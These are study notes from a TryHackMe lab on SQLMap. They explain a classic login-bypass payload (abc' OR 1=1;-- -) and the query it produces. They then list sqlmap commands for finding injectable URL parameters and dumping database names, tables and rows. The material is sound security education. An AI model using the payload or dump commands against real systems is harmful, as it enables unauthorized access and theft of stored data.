https://tryhackme.com/room/sqlmapthebasics

### Table of contents
- [[#Intro]]

___
### Intro
[[#Table of contents|Back to the top]]

***Example***

Website requires login
`Username: John`
`Password: Un@detectable444`

Website receives credentials and uses them to browse database
```SQL
SELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';
```

If input improperly sanitized and validated, then vulnerable to injection
`Username: John`
`Password: abc' OR 1=1;-- -`

```SQL
SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';
```
`1=1` is always true, so no matter if the password is incorrect, the query will go through
`-- -` comments whatever is next

The **single quote after `abc`** makes it that the query takes only `abc` as the password and not the rest of the payload:
- `abc OR 1=1;-- -` (without single quote)
```SQL
password = 'abc OR 1=1; -- -'
```
- `abc' OR 1=1;-- -`
```SQL
password = 'abc' OR 1=1; -- -'
```


___
### Automated SQL Injection
[[#Table of contents|Back to the top]]

--> SQLMap: detect, exploit SQL injection vulnerabilities in webapps

`sqlmap --help`

`sqlmap --wizard`: guides through each step before launching scan

`sqlmap --dbs`: extract database names
	--> `sqlmap -D database_name --tables`
		-->`sqlmap -D database_name -T table_name --dump`

Webapp uses GET parameters to retrieve data (`http://target.org/search?var=1)`, suppose URL becomes `http://target.org/search/var=1` when we click on search
	--> `sqlmap -u http://target.org/search/var=1`
	--> shows which types of injections URL is vulnerable to